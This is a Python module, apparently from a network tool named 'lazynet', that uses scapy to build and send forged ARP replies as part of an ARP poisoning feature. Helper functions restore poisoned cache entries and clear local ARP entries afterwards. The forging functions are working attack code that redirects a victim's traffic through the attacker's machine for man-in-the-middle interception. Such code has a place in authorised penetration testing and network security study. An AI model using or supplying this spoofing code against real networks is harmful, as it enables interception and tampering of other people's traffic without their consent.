""" ARP packet builders used by the poisoning feature """

import logging
import subprocess

from scapy.all import ARP, Ether

from ..shared.constants import IS_LINUX, IS_WINDOWS
from ..shared.packets import send_frame


logger = logging.getLogger("lazynet")


def build_arp_reply(target_ip, target_mac, spoof_ip, attacker_mac):
    """Build an Ethernet frame containing a forged ARP reply"""
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(
        op=2, # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac
    )
    return ether / arp


def send_arp_reply(target_ip, target_mac, spoof_ip, attacker_mac, interface):
    """Send one forged ARP reply"""
    frame = build_arp_reply(target_ip, target_mac, spoof_ip, attacker_mac)
    send_frame(frame, interface)


def restore_arp_entry(destination_ip, destination_mac,
                      source_ip, source_mac, interface, count=4):
    """Send correct ARP replies to restore one ARP cache entry"""
    ether = Ether(dst=destination_mac)
    arp = ARP(
        op=2, # ARP reply
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    send_frame(ether / arp, interface, count=count)


def clear_local_arp_entry(ip, interface=None):
    """
    Used after active verification to undo any accidental
    self poisoning caused by the victim's reply
    """
    try:
        if IS_WINDOWS:
            subprocess.run(["arp", "-d", ip], check=False, capture_output=True)
        elif IS_LINUX:
            command = ["ip", "neigh", "del", ip]
            if interface:
                command.extend(["dev", interface])
            subprocess.run(command, check=False, capture_output=True)
    except Exception:
        logger.debug(f"Could not clear local ARP entry for {ip}", exc_info=True)
